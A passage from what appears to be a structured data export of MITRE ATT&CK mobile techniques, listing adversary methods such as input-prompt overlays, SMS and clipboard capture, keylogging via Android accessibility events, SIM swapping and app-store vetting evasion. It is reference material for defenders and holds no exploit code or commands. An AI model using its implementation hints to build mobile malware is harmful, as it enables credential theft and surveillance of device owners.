                          'ability to provide users with contextual information, making users more susceptible to this '
                          'technique’s use.(Citation: Felt-PhishingOnMobileDevices)\n'
                          '\n'
                          'Specific approaches to this technique include:\n'
                          '\n'
                          '### Impersonate the identity of a legitimate application\n'
                          '\n'
                          'A malicious application could impersonate the identity of a legitimate application (e.g. '
                          'use the same application name and/or icon) and get installed on the device. The malicious '
                          'app could then prompt the user for sensitive information.(Citation: eset-finance)\n'
                          '\n'
                          '### Display a prompt on top of a running legitimate application\n'
                          '\n'
                          'A malicious application could display a prompt on top of a running legitimate application '
                          'to trick users into entering sensitive information into the malicious application rather '
                          'than the legitimate application. Typically, the malicious application would need to know '
                          'when the targeted application (and individual activity within the targeted application) is '
                          'running in the foreground, so that the malicious application knows when to display its '
                          'prompt. Android 5.0 and 5.1.1, respectively, increased the difficulty of determining the '
                          'current foreground application through modifications to the `ActivityManager` '
                          'API.(Citation: Android-getRunningTasks)(Citation: StackOverflow-getRunningAppProcesses). A '
                          'malicious application can still abuse Android’s accessibility features to determine which '
                          'application is currently in the foreground.(Citation: ThreatFabric Cerberus) Approaches to '
                          'display a prompt include:\n'
                          '\n'
                          '* A malicious application could start a new activity on top of a running legitimate '
                          'application.(Citation: Felt-PhishingOnMobileDevices)(Citation: Hassell-ExploitingAndroid) '
                          'Android 10 places new restrictions on the ability for an application to start a new '
                          'activity on top of another application, which may make it more difficult for adversaries to '
                          'utilize this technique.(Citation: Android Background)\n'
                          '* A malicious application could create an application overlay window on top of a running '
                          'legitimate application. Applications must hold the `SYSTEM_ALERT_WINDOW` permission to '
                          'create overlay windows. This permission is handled differently than typical Android '
                          'permissions, and at least under certain conditions is automatically granted to applications '
                          'installed from the Google Play Store.(Citation: Cloak and Dagger)(Citation: NowSecure '
                          'Android Overlay)(Citation: Skycure-Accessibility) The `SYSTEM_ALERT_WINDOW` permission and '
                          'its associated ability to create application overlay windows are expected to be deprecated '
                          'in a future release of Android in favor of a new API.(Citation: XDA Bubbles)\n'
                          '\n'
                          '### Fake device notifications\n'
                          '\n'
                          'A malicious application could send fake device notifications to the user. Clicking on the '
                          'device notification could trigger the malicious application to display an input '
                          'prompt.(Citation: Group IB Gustuff Mar 2019)',
           'name': 'Input Prompt',
           'platforms': ['Android', 'iOS']},
 'T1412': {'attack_id': 'T1412',
           'categories': ['collection', 'credential-access'],
           'description': 'A malicious application could capture sensitive data sent via SMS, including authentication '
                          'credentials. SMS is frequently used to transmit codes used for multi-factor '
                          'authentication.\n'
                          '\n'
                          'On Android, a malicious application must request and obtain permission (either at app '
                          'install time or run time) in order to receive SMS messages. Alternatively, a malicious '
                          'application could attempt to perform an operating system privilege escalation attack to '
                          'bypass the permission requirement.\n'
                          '\n'
                          'On iOS, applications cannot access SMS messages in normal operation, so an adversary would '
                          'need to attempt to perform an operating system privilege escalation attack to potentially '
                          'be able to access SMS messages.',
           'name': 'Capture SMS Messages',
           'platforms': ['Android', 'iOS']},
 'T1413': {'attack_id': 'T1413',
           'categories': ['collection', 'credential-access'],
           'description': 'On versions of Android prior to 4.1, an adversary may use a malicious application that '
                          'holds the READ_LOGS permission to obtain private keys, passwords, other credentials, or '
                          "other sensitive data stored in the device's system log. On Android 4.1 and later, an "
                          'adversary would need to attempt to perform an operating system privilege escalation attack '
                          'to be able to access the log.',
           'name': 'Access Sensitive Data in Device Logs',
           'platforms': ['Android']},
 'T1414': {'attack_id': 'T1414',
           'categories': ['collection', 'credential-access'],
           'description': 'Adversaries may abuse Clipboard Manager APIs to obtain sensitive information copied to the '
                          'global clipboard. For example, passwords being copy-and-pasted from a password manager app '
                          'could be captured by another application installed on the device.(Citation: '
                          'Fahl-Clipboard)\n'
                          '\n'
                          'On Android, <code>ClipboardManager.OnPrimaryClipChangedListener</code> can be used by '
                          'applications to register as a listener and monitor the clipboard for changes.(Citation: '
                          'Github Capture Clipboard 2019)\n'
                          '\n'
                          'Android 10 mitigates this technique by preventing applications from accessing clipboard '
                          'data unless the application is on the foreground or is set as the device’s default input '
                          'method editor (IME).(Citation: Android 10 Privacy Changes)',
           'name': 'Capture Clipboard Data',
           'platforms': ['Android', 'iOS']},
 'T1415': {'attack_id': 'T1415',
           'categories': ['credential-access'],
           'description': 'An iOS application may be able to maliciously claim a URL scheme, allowing it to intercept '
                          'calls that are meant for a different application(Citation: FireEye-Masque2)(Citation: '
                          'Dhanjani-URLScheme). This technique, for example, could be used to capture OAuth '
                          'authorization codes(Citation: IETF-PKCE) or to phish user credentials(Citation: '
                          'MobileIron-XARA).',
           'name': 'URL Scheme Hijacking',
           'platforms': ['iOS']},
 'T1416': {'attack_id': 'T1416',
           'categories': ['credential-access'],
           'description': 'A malicious app can register to receive intents meant for other applications and may then '
                          'be able to receive sensitive values such as OAuth authorization codes(Citation: IETF-PKCE).',
           'name': 'Android Intent Hijacking',
           'platforms': ['Android']},
 'T1417': {'attack_id': 'T1417',
           'categories': ['collection', 'credential-access'],
           'description': 'Adversaries may capture user input to obtain credentials or other information from the user '
                          'through various methods.\n'
                          '\n'
                          'Malware may masquerade as a legitimate third-party keyboard to record user '
                          'keystrokes.(Citation: Zeltser-Keyboard) On both Android and iOS, users must explicitly '
                          'authorize the use of third-party keyboard apps. Users should be advised to use extreme '
                          'caution before granting this authorization when it is requested.\n'
                          '\n'
                          'On Android, malware may abuse accessibility features to record keystrokes by registering an '
                          '`AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening '
                          'for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type. The event object passed '
                          'into the function will contain the data that the user typed.\n'
                          '\n'
                          'Additional methods of keylogging may be possible if root access is available.',
           'name': 'Input Capture',
           'platforms': ['Android', 'iOS']},
 'T1418': {'attack_id': 'T1418',
           'categories': ['defense-evasion', 'discovery'],
           'description': 'Adversaries may seek to identify all applications installed on the device. One use case for '
                          'doing so is to identify the presence of endpoint security applications that may increase '
                          "the adversary's risk of detection. Another use case is to identify the presence of "
                          'applications that the adversary may wish to target.\n'
                          '\n'
                          'On Android, applications can use methods in the PackageManager class (Citation: '
                          'Android-PackageManager) to enumerate other apps installed on device, or an entity with '
                          'shell access can use the pm command line tool.\n'
                          '\n'
                          'On iOS, apps can use private API calls to obtain a list of other apps installed on the '
                          'device. (Citation: Kurtz-MaliciousiOSApps) However, use of private API calls will likely '
                          "prevent the application from being distributed through Apple's App Store.",
           'name': 'Application Discovery',
           'platforms': ['Android', 'iOS']},
 'T1420': {'attack_id': 'T1420',
           'categories': ['discovery'],
           'description': 'On Android, command line tools or the Java file APIs can be used to enumerate file system '
                          'contents. However, Linux file permissions and SELinux policies generally strongly restrict '
                          'what can be accessed by apps (without taking advantage of a privilege escalation exploit). '
                          'The contents of the external storage directory are generally visible, which could present '
                          'concern if sensitive data is inappropriately stored there.\n'
                          '\n'
                          "iOS's security architecture generally restricts the ability to perform file and directory "
                          'discovery without use of escalated privileges.',
           'name': 'File and Directory Discovery',
           'platforms': ['Android']},
 'T1421': {'attack_id': 'T1421',
           'categories': ['discovery'],
           'description': 'On Android, applications can use standard APIs to gather a list of network connections to '
                          'and from the device. For example, the Network Connections app available in the Google Play '
                          'Store (Citation: ConnMonitor) advertises this functionality.',
           'name': 'System Network Connections Discovery',
           'platforms': ['Android']},
 'T1422': {'attack_id': 'T1422',
           'categories': ['discovery'],
           'description': 'On Android, details of onboard network interfaces are accessible to apps through the '
                          'java.net.NetworkInterface class (Citation: NetworkInterface). The Android TelephonyManager '
                          'class can be used to gather related information such as the IMSI, IMEI, and phone number '
                          '(Citation: TelephonyManager).',
           'name': 'System Network Configuration Discovery',
           'platforms': ['Android']},
 'T1423': {'attack_id': 'T1423',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of services running on remote hosts, including '
                          'those that may be vulnerable to remote software exploitation. Methods to acquire this '
                          'information include port scans and vulnerability scans from the mobile device. This '
                          "technique may take advantage of the mobile device's access to an internal enterprise "
                          'network either through local connectivity or through a Virtual Private Network (VPN).',
           'name': 'Network Service Scanning',
           'platforms': ['Android', 'iOS']},
 'T1424': {'attack_id': 'T1424',
           'categories': ['discovery'],
           'description': 'On Android versions prior to 5, applications can observe information about other processes '
                          'that are running through methods in the ActivityManager class. On Android versions prior to '
                          '7, applications can obtain this information by executing the <code>ps</code> command, or by '
                          'examining the <code>/proc</code> directory. Starting in Android version 7, use of the Linux '
                          "kernel's <code>hidepid</code> feature prevents applications (without escalated privileges) "
                          'from accessing this information (Citation: Android-SELinuxChanges).',
           'name': 'Process Discovery',
           'platforms': ['Android']},
 'T1426': {'attack_id': 'T1426',
           'categories': ['discovery'],
           'description': 'An adversary may attempt to get detailed information about the operating system and '
                          'hardware, including version, patches, and architecture.\n'
                          '\n'
                          'On Android, much of this information is programmatically accessible to applications through '
                          'the android.os.Build class(Citation: Android-Build).\n'
                          '\n'
                          'On iOS, techniques exist for applications to programmatically access this '
                          'information(Citation: StackOverflow-iOSVersion).',
           'name': 'System Information Discovery',
           'platforms': ['Android', 'iOS']},
 'T1427': {'attack_id': 'T1427',
           'categories': ['lateral-movement'],
           'description': 'With escalated privileges, an adversary could program the mobile device to impersonate USB '
                          'devices such as input devices (keyboard and mouse), storage devices, and/or networking '
                          'devices in order to attack a physically connected PC(Citation: '
                          'Wang-ExploitingUSB)(Citation: ArsTechnica-PoisonTap) This technique has been demonstrated '
                          'on Android. We are unaware of any demonstrations on iOS.',
           'name': 'Attack PC via USB Connection',
           'platforms': ['Android']},
 'T1428': {'attack_id': 'T1428',
           'categories': ['lateral-movement'],
           'description': 'Adversaries may attempt to exploit enterprise servers, workstations, or other resources '
                          "over the network. This technique may take advantage of the mobile device's access to an "
                          'internal enterprise network either through local connectivity or through a Virtual Private '
                          'Network (VPN).',
           'name': 'Exploit Enterprise Resources',
           'platforms': ['Android', 'iOS']},
 'T1429': {'attack_id': 'T1429',
           'categories': ['collection'],
           'description': 'Adversaries may capture audio to collect information on a user of a mobile device using '
                          'standard operating system APIs. Adversaries may target audio information such as user '
                          'conversations, surroundings, phone calls, or other sensitive information.\n'
                          '\n'
                          'Android and iOS, by default, requires that an application request access to microphone '
                          'devices from the user. In Android, applications must hold the '
                          '<code>android.permission.RECORD_AUDIO</code> permission to access the microphone and the '
                          '<code>android.permission.CAPTURE_AUDIO_OUTPUT</code> permission to access audio output such '
                          'as speakers. Android does not allow third-party applications to hold '
                          '<code>android.permission.CAPTURE_AUDIO_OUTPUT</code>, so audio output can only be obtained '
                          'by privileged applications (distributed by Google or the device vendor) or after a '
                          'successful privilege escalation attack. In iOS, applications must include the '
                          '`NSMicrophoneUsageDescription` key in their `Info.plist` file.',
           'name': 'Capture Audio',
           'platforms': ['Android', 'iOS']},
 'T1430': {'attack_id': 'T1430',
           'categories': ['collection', 'discovery'],
           'description': 'An adversary could use a malicious or exploited application to surreptitiously track the '
                          "device's physical location through use of standard operating system APIs.",
           'name': 'Location Tracking',
           'platforms': ['Android', 'iOS']},
 'T1432': {'attack_id': 'T1432',
           'categories': ['collection'],
           'description': 'An adversary could call standard operating system APIs from a malicious application to '
                          'gather contact list (i.e., address book) data, or with escalated privileges could directly '
                          'access files containing contact list data.',
           'name': 'Access Contact List',
           'platforms': ['Android', 'iOS']},
 'T1433': {'attack_id': 'T1433',
           'categories': ['collection'],
           'description': 'On Android, an adversary could call standard operating system APIs from a malicious '
                          'application to gather call log data, or with escalated privileges could directly access '
                          'files containing call log data.\n'
                          '\n'
                          'On iOS, applications do not have access to the call log, so privilege escalation would be '
                          'required in order to access the data.',
           'name': 'Access Call Log',
           'platforms': ['Android', 'iOS']},
 'T1435': {'attack_id': 'T1435',
           'categories': ['collection'],
           'description': 'An adversary could call standard operating system APIs from a malicious application to '
                          'gather calendar entry data, or with escalated privileges could directly access files '
                          'containing calendar data.',
           'name': 'Access Calendar Entries',
           'platforms': ['Android', 'iOS']},
 'T1436': {'attack_id': 'T1436',
           'categories': ['command-and-control', 'exfiltration'],
           'description': 'Adversaries may communicate over a commonly used port to bypass firewalls or network '
                          'detection systems and to blend with normal network activity to avoid more detailed '
                          'inspection. \n'
                          '\n'
                          'They may use commonly open ports such as\n'
                          '\n'
                          '* TCP:80 (HTTP)\n'
                          '* TCP:443 (HTTPS)\n'
                          '* TCP:25 (SMTP)\n'
                          '* TCP/UDP:53 (DNS)\n'
                          '\n'
                          'They may use the protocol associated with the port or a completely different protocol.',
           'name': 'Commonly Used Port',
           'platforms': ['Android', 'iOS']},
 'T1437': {'attack_id': 'T1437',
           'categories': ['command-and-control', 'exfiltration'],
           'description': 'Adversaries may communicate using a common, standardized application layer protocol such as '
                          'HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic.\n'
                          '\n'
                          'In the mobile environment, the Google Cloud Messaging (GCM; two-way) and Apple Push '
                          'Notification Service (APNS; one-way server-to-device) are commonly used protocols on '
                          'Android and iOS respectively that would blend in with routine device traffic and are '
                          'difficult for enterprises to inspect. Google reportedly responds to reports of abuse by '
                          'blocking access to GCM.(Citation: Kaspersky-MobileMalware)',
           'name': 'Standard Application Layer Protocol',
           'platforms': ['Android', 'iOS']},
 'T1438': {'attack_id': 'T1438',
           'categories': ['command-and-control', 'exfiltration'],
           'description': 'Adversaries can communicate using cellular networks rather than enterprise Wi-Fi in order '
                          'to bypass enterprise network monitoring systems. Adversaries may also communicate using '
                          'other non-Internet Protocol mediums such as SMS, NFC, or Bluetooth to bypass network '
                          'monitoring systems.',
           'name': 'Alternate Network Mediums',
           'platforms': ['Android', 'iOS']},
 'T1439': {'attack_id': 'T1439',
           'categories': ['network-effects'],
           'description': 'If network traffic between the mobile device and remote servers is unencrypted or is '
                          'encrypted in an insecure manner, then an adversary positioned on the network can eavesdrop '
                          'on communication.(Citation: mHealth)',
           'name': 'Eavesdrop on Insecure Network Communication',
           'platforms': ['Android', 'iOS']},
 'T1444': {'attack_id': 'T1444',
           'categories': ['initial-access'],
           'description': 'An adversary could distribute developed malware by masquerading the malware as a legitimate '
                          'application. This can be done in two different ways: by embedding the malware in a '
                          'legitimate application, or by pretending to be a legitimate application.\n'
                          '\n'
                          'Embedding the malware in a legitimate application is done by downloading the application, '
                          'disassembling it, adding the malicious code, and then re-assembling it.(Citation: Zhou) The '
                          'app would appear to be the original app, but would contain additional malicious '
                          'functionality. The adversary could then publish the malicious application to app stores or '
                          'use another delivery method.\n'
                          '\n'
                          'Pretending to be a legitimate application relies heavily on lack of scrutinization by the '
                          'user. Typically, a malicious app pretending to be a legitimate one will have many similar '
                          'details as the legitimate one, such as name, icon, and description.(Citation: Palo Alto '
                          'HenBox)',
           'name': 'Masquerade as Legitimate Application',
           'platforms': ['Android', 'iOS']},
 'T1446': {'attack_id': 'T1446',
           'categories': ['impact', 'defense-evasion'],
           'description': 'An adversary may seek to lock the legitimate user out of the device, for example to inhibit '
                          'user interaction or to obtain a ransom payment.\n'
                          '\n'
                          'On Android versions prior to 7, apps can abuse Device Administrator access to reset the '
                          'device lock passcode to prevent the user from unlocking the device. After Android 7, only '
                          'device or profile owners (e.g. MDMs) can reset the device’s passcode.(Citation: Android '
                          'resetPassword)\n'
                          '\n'
                          'On iOS devices, this technique does not work because mobile device management servers can '
                          'only remove the screen lock passcode, they cannot set a new passcode. However, on '
                          'jailbroken devices, malware has been discovered that can lock the user out of the '
                          'device.(Citation: Xiao-KeyRaider)',
           'name': 'Device Lockout',
           'platforms': ['Android', 'iOS']},
 'T1447': {'attack_id': 'T1447',
           'categories': ['impact'],
           'description': 'An adversary could wipe the entire device contents or delete specific files. A malicious '
                          'application could obtain and abuse Android device administrator access to wipe the entire '
                          'device.(Citation: Android DevicePolicyManager 2019) Access to external storage directories '
                          'or escalated privileges could be used to delete individual files.',
           'name': 'Delete Device Data',
           'platforms': ['Android']},
 'T1448': {'attack_id': 'T1448',
           'categories': ['impact'],
           'description': 'A malicious app could use standard Android APIs to send SMS messages. SMS messages could '
                          'potentially be sent to premium numbers that charge the device owner and generate revenue '
                          'for an adversary(Citation: Lookout-SMS).\n'
                          '\n'
                          'On iOS, apps cannot send SMS messages.\n'
                          '\n'
                          'On Android, apps must hold the SEND_SMS permission to send SMS messages. Additionally, '
                          'Android version 4.2 and above has mitigations against this threat by requiring user consent '
                          'before allowing SMS messages to be sent to premium numbers (Citation: AndroidSecurity2014).',
           'name': 'Premium SMS Toll Fraud',
           'platforms': ['Android']},
 'T1449': {'attack_id': 'T1449',
           'categories': ['network-effects'],
           'description': 'An adversary could exploit signaling system vulnerabilities to redirect calls or text '
                          "messages (SMS) to a phone number under the attacker's control. The adversary could then act "
                          'as a man-in-the-middle to intercept or manipulate the communication. (Citation: Engel-SS7) '
                          '(Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: '
                          'CSRIC5-WG10-FinalReport) Interception of SMS messages could enable adversaries to obtain '
                          'authentication codes used for multi-factor authentication(Citation: TheRegister-SS7).',
           'name': 'Exploit SS7 to Redirect Phone Calls/SMS',
           'platforms': ['Android', 'iOS']},
 'T1450': {'attack_id': 'T1450',
           'categories': ['network-effects'],
           'description': 'An adversary could exploit signaling system vulnerabilities to track the location of mobile '
                          'devices. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) '
                          '(Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport)',
           'name': 'Exploit SS7 to Track Device Location',
           'platforms': ['Android', 'iOS']},
 'T1451': {'attack_id': 'T1451',
           'categories': ['network-effects'],
           'description': 'An adversary could convince the mobile network operator (e.g. through social networking, '
                          'forged identification, or insider attacks performed by trusted employees) to issue a new '
                          'SIM card and associate it with an existing phone number and account (Citation: '
                          'NYGov-Simswap) (Citation: Motherboard-Simswap2). The adversary could then obtain SMS '
                          'messages or hijack phone calls intended for someone else (Citation: Betanews-Simswap). \n'
                          '\n'
                          'One use case is intercepting authentication messages or phone calls to obtain illicit '
                          'access to online banking or other online accounts, as many online services allow account '
                          'password resets by sending an authentication code over SMS to a phone number associated '
                          'with the account (Citation: Guardian-Simswap) (Citation: Motherboard-Simswap1)(Citation: '
                          'Krebs-SimSwap)(Citation: TechCrunch-SimSwap).',
           'name': 'SIM Card Swap',
           'platforms': ['Android', 'iOS']},
 'T1452': {'attack_id': 'T1452',
           'categories': ['impact'],
           'description': "An adversary could use access to a compromised device's credentials to attempt to "
                          'manipulate app store rankings or ratings by triggering application downloads or posting '
                          'fake reviews of applications. This technique likely requires privileged access (a rooted or '
                          'jailbroken device).',
           'name': 'Manipulate App Store Rankings or Ratings',
           'platforms': ['Android', 'iOS']},
 'T1453': {'attack_id': 'T1453',
           'categories': ['collection', 'credential-access', 'impact', 'defense-evasion'],
           'description': '**This technique has been deprecated by [Input '
                          'Capture](https://attack.mitre.org/techniques/T1417), [Input '
                          'Injection](https://attack.mitre.org/techniques/T1516), and [Input '
                          'Prompt](https://attack.mitre.org/techniques/T1411).**\n'
                          '\n'
                          "A malicious app could abuse Android's accessibility features to capture sensitive data or "
                          'perform other malicious actions.(Citation: Skycure-Accessibility)\n'
                          '\n'
                          "Adversaries may abuse accessibility features on Android to emulate a user's clicks, for "
                          "example to steal money from a user's bank account.(Citation: "
                          'android-trojan-steals-paypal-2fa)(Citation: banking-trojans-google-play)\n'
                          '\n'
                          'Adversaries may abuse accessibility features on Android devices to evade defenses by '
                          'repeatedly clicking the "Back" button when a targeted app manager or mobile security app is '
                          'launched, or when strings suggesting uninstallation are detected in the foreground. This '
                          'effectively prevents the malicious application from being uninstalled.(Citation: '
                          'android-trojan-steals-paypal-2fa)',
           'name': 'Abuse Accessibility Features',
           'platforms': ['Android']},
 'T1456': {'attack_id': 'T1456',
           'categories': ['initial-access'],
           'description': 'As described by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), a '
                          'drive-by compromise is when an adversary gains access to a system through a user visiting a '
                          "website over the normal course of browsing. With this technique, the user's web browser is "
                          'targeted for exploitation. For example, a website may contain malicious media content '
                          'intended to exploit vulnerabilities in media parsers as demonstrated by the Android '
                          'Stagefright vulnerability  (Citation: Zimperium-Stagefright).\n'
                          '\n'
                          '(This technique was formerly known as Malicious Web Content. It has been renamed to better '
                          'align with ATT&CK for Enterprise.)',
           'name': 'Drive-by Compromise',
           'platforms': ['Android', 'iOS']},
 'T1458': {'attack_id': 'T1458',
           'categories': ['initial-access'],
           'description': 'If the mobile device is connected (typically via USB) to a charging station or a PC, for '
                          "example to charge the device's battery, then a compromised or malicious charging station or "
                          'PC could attempt to exploit the mobile device via the connection(Citation: '
                          'Krebs-JuiceJacking).\n'
                          '\n'
                          'Previous demonstrations have included:\n'
                          '\n'
                          '* Injecting malicious applications into iOS devices(Citation: Lau-Mactans).\n'
                          '* Exploiting a Nexus 6 or 6P device over USB and gaining the ability to perform actions '
                          'including intercepting phone calls, intercepting network traffic, and obtaining the device '
                          'physical location(Citation: IBM-NexusUSB).\n'
                          '* Exploiting Android devices such as the Google Pixel 2 over USB(Citation: '
                          'GoogleProjectZero-OATmeal).\n'
                          '\n'
                          'Products from Cellebrite and Grayshift purportedly can use physical access to the data port '
                          'to unlock the passcode on some iOS devices(Citation: Computerworld-iPhoneCracking).',
           'name': 'Exploit via Charging Station or PC',
           'platforms': ['Android', 'iOS']},
 'T1461': {'attack_id': 'T1461',
           'categories': ['initial-access'],
           'description': "An adversary with physical access to a mobile device may seek to bypass the device's "
                          'lockscreen.\n'
                          '\n'
                          '### Biometric Spoofing\n'
                          "If biometric authentication is used, an adversary could attempt to spoof a mobile device's "
                          'biometric authentication mechanism(Citation: SRLabs-Fingerprint)(Citation: '
                          'SecureIDNews-Spoof)(Citation: TheSun-FaceID).\n'
                          '\n'
                          'iOS partly mitigates this attack by requiring the device passcode rather than a fingerprint '
                          'to unlock the device after every device restart and after 48 hours since the device was '
                          'last unlocked (Citation: Apple-TouchID). Android has similar mitigations.\n'
                          '\n'
                          '### Device Unlock Code Guessing or Brute Force\n'
                          'An adversary could attempt to brute-force or otherwise guess the lockscreen passcode '
                          '(typically a PIN or password), including physically observing ("shoulder surfing") the '
                          "device owner's use of the lockscreen passcode. \n"
                          '\n'
                          '### Exploit Other Device Lockscreen Vulnerabilities\n'
                          'Techniques have periodically been demonstrated that exploit vulnerabilities on Android '
                          '(Citation: Wired-AndroidBypass), iOS (Citation: Kaspersky-iOSBypass), or other mobile '
                          'devices to bypass the device lockscreen. The vulnerabilities are generally patched by the '
                          'device/operating system vendor once they become aware of their existence.',
           'name': 'Lockscreen Bypass',
           'platforms': ['Android', 'iOS']},
 'T1463': {'attack_id': 'T1463',
           'categories': ['network-effects'],
           'description': 'If network traffic between the mobile device and a remote server is not securely protected, '
                          'then an attacker positioned on the network may be able to manipulate network communication '
                          'without being detected. For example, FireEye researchers found in 2014 that 68% of the top '
                          '1,000 free applications in the Google Play Store had at least one Transport Layer Security '
                          "(TLS) implementation vulnerability potentially opening the applications' network traffic to "
                          'man-in-the-middle attacks (Citation: FireEye-SSL).',
           'name': 'Manipulate Device Communication',
           'platforms': ['Android', 'iOS']},
 'T1464': {'attack_id': 'T1464',
           'categories': ['network-effects'],
           'description': 'An attacker could jam radio signals (e.g. Wi-Fi, cellular, GPS) to prevent the mobile '
                          'device from communicating. (Citation: NIST-SP800187)(Citation: CNET-Celljammer)(Citation: '
                          'NYTimes-Celljam)(Citation: Digitaltrends-Celljam)(Citation: Arstechnica-Celljam)',
           'name': 'Jamming or Denial of Service',
           'platforms': ['Android', 'iOS']},
 'T1465': {'attack_id': 'T1465',
           'categories': ['network-effects'],
           'description': 'An adversary could set up unauthorized Wi-Fi access points or compromise existing access '
                          'points and, if the device connects to them, carry out network-based attacks such as '
                          'eavesdropping on or modifying network communication(Citation: NIST-SP800153)(Citation: '
                          'Kaspersky-DarkHotel).',
           'name': 'Rogue Wi-Fi Access Points',
           'platforms': ['Android', 'iOS']},
 'T1466': {'attack_id': 'T1466',
           'categories': ['network-effects'],
           'description': 'An adversary could cause the mobile device to use less secure protocols, for example by '
                          'jamming frequencies used by newer protocols such as LTE and only allowing older protocols '
                          'such as GSM to communicate(Citation: NIST-SP800187). Use of less secure protocols may make '
                          'communication easier to eavesdrop upon or manipulate.',
           'name': 'Downgrade to Insecure Protocols',
           'platforms': ['Android', 'iOS']},
 'T1467': {'attack_id': 'T1467',
           'categories': ['network-effects'],
           'description': 'An adversary could set up a rogue cellular base station and then use it to eavesdrop on or '
                          'manipulate cellular device communication. A compromised cellular femtocell could be used to '
                          'carry out this technique(Citation: Computerworld-Femtocell).',
           'name': 'Rogue Cellular Base Station',
           'platforms': ['Android', 'iOS']},
 'T1468': {'attack_id': 'T1468',
           'categories': ['remote-service-effects'],
           'description': 'An adversary who is able to obtain unauthorized access to or misuse authorized access to '
                          "cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or "
                          'to an enterprise mobility management (EMM) / mobile device management (MDM) server console '
                          'could use that access to track mobile devices.(Citation: Krebs-Location)',
           'name': 'Remotely Track Device Without Authorization',
           'platforms': ['Android', 'iOS']},
 'T1469': {'attack_id': 'T1469',
           'categories': ['remote-service-effects'],
           'description': 'An adversary who is able to obtain unauthorized access to or misuse authorized access to '
                          "cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or "
                          'to an EMM console could use that access to wipe enrolled devices (Citation: Honan-Hacking).',
           'name': 'Remotely Wipe Data Without Authorization',
           'platforms': ['Android', 'iOS']},
 'T1470': {'attack_id': 'T1470',
           'categories': ['remote-service-effects'],
           'description': 'An adversary who is able to obtain unauthorized access to or misuse authorized access to '
                          "cloud backup services (e.g. Google's Android backup service or Apple's iCloud) could use "
                          'that access to obtain sensitive data stored in device backups. For example, the Elcomsoft '
                          "Phone Breaker product advertises the ability to retrieve iOS backup data from Apple's "
                          'iCloud (Citation: Elcomsoft-EPPB). Elcomsoft also describes (Citation: Elcomsoft-WhatsApp) '
                          'obtaining WhatsApp communication histories from backups stored in iCloud.',
           'name': 'Obtain Device Cloud Backups',
           'platforms': ['Android', 'iOS']},
 'T1471': {'attack_id': 'T1471',
           'categories': ['impact'],
           'description': 'An adversary may encrypt files stored on the mobile device to prevent the user from '
                          'accessing them, for example with the intent of only unlocking access to the files after a '
                          'ransom is paid. Without escalated privileges, the adversary is generally limited to only '
                          'encrypting files in external/shared storage locations. This technique has been demonstrated '
                          'on Android. We are unaware of any demonstrated use on iOS.',
           'name': 'Data Encrypted for Impact',
           'platforms': ['Android']},
 'T1472': {'attack_id': 'T1472',
           'categories': ['impact'],
           'description': 'An adversary could seek to generate fraudulent advertising revenue from mobile devices, for '
                          'example by triggering automatic clicks of advertising links without user involvement.',
           'name': 'Generate Fraudulent Advertising Revenue',
           'platforms': ['Android', 'iOS']},
 'T1474': {'attack_id': 'T1474',
           'categories': ['initial-access'],
           'description': 'As further described in [Supply Chain '
                          'Compromise](https://attack.mitre.org/techniques/T1195), supply chain compromise is the '
                          'manipulation of products or product delivery mechanisms prior to receipt by a final '
                          'consumer for the purpose of data or system compromise. Somewhat related, adversaries could '
                          'also identify and exploit inadvertently present vulnerabilities. In many cases, it may be '
                          'difficult to be certain whether exploitable functionality is due to malicious intent or '
                          'simply inadvertent mistake.\n'
                          '\n'
                          'Related PRE-ATT&CK techniques include:\n'
                          '\n'
                          '* [Identify vulnerabilities in third-party software '
                          'libraries](https://attack.mitre.org/techniques/T1389) - Third-party libraries incorporated '
                          'into mobile apps could contain malicious behavior, privacy-invasive behavior, or '
                          'exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or '
                          'could exploit inadvertent vulnerabilities. For example, Ryan Welton of NowSecure identified '
                          'exploitable remote code execution vulnerabilities in a third-party advertisement library '
                          '(Citation: NowSecure-RemoteCode). Grace et al. identified security issues in mobile '
                          'advertisement libraries (Citation: Grace-Advertisement).\n'
                          '* [Distribute malicious software development '
                          'tools](https://attack.mitre.org/techniques/T1394) - As demonstrated by the XcodeGhost '
                          'attack (Citation: PaloAlto-XcodeGhost1), app developers could be provided with modified '
                          'versions of software development tools (e.g. compilers) that automatically inject malicious '
                          'or exploitable code into applications.',
           'name': 'Supply Chain Compromise',
           'platforms': ['Android', 'iOS']},
 'T1475': {'attack_id': 'T1475',
           'categories': ['initial-access'],
           'description': 'Malicious applications are a common attack vector used by adversaries to gain a presence on '
                          'mobile devices. Mobile devices often are configured to allow application installation only '
                          'from an authorized app store (e.g., Google Play Store or Apple App Store). An adversary may '
                          'seek to place a malicious application in an authorized app store, enabling the application '
                          'to be installed onto targeted devices.\n'
                          '\n'
                          'App stores typically require developer registration and use vetting techniques to identify '
                          'malicious applications. Adversaries may use these techniques against app store defenses:\n'
                          '\n'
                          '* [Download New Code at Runtime](https://attack.mitre.org/techniques/T1407)\n'
                          '* [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1406)\n'
                          '\n'
                          'Adversaries may also seek to evade vetting by placing code in a malicious application to '
                          'detect whether it is running in an app analysis environment and, if so, avoid performing '
                          'malicious actions while under analysis. (Citation: Petsas) (Citation: Oberheide-Bouncer) '
                          '(Citation: Percoco-Bouncer) (Citation: Wang)\n'
                          '\n'
                          'Adversaries may also use fake identities, payment cards, etc., to create developer accounts '
                          'to publish malicious applications to app stores. (Citation: Oberheide-Bouncer)\n'
                          '\n'
                          "Adversaries may also use control of a target's Google account to use the Google Play "
                          "Store's remote installation capability to install apps onto the Android devices associated "
                          'with the Google account. (Citation: Oberheide-RemoteInstall) (Citation: Konoth) (Only '
                          'applications that are available for download through the Google Play Store can be remotely '
                          'installed using this technique.)',
           'name': 'Deliver Malicious App via Authorized App Store',
           'platforms': ['Android', 'iOS']},
 'T1476': {'attack_id': 'T1476',
           'categories': ['initial-access'],
           'description': 'Malicious applications are a common attack vector used by adversaries to gain a presence on '
